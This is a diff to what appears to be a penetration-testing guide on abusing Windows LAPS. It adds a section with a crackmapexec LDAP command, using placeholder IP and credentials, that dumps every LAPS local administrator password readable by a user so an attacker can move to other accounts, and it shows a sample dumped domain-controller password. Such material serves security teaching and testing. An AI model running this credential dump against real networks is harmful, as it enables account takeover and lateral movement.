@@ -99,6 +99,12 @@ ComputerName                Password       Expiration
 ------------                --------       ----------
 DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
 ```
+## **Dumping LAPS Passwords With Crackmapexec**
+If there is no access to a powershell you can abuse this privilege remotely through LDAP by using 
+```
+crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
+```
+This will dump all the passwords that the user can read, allowing you to get a better foothold with a different user.
 
 ## **LAPS Persistence**
 
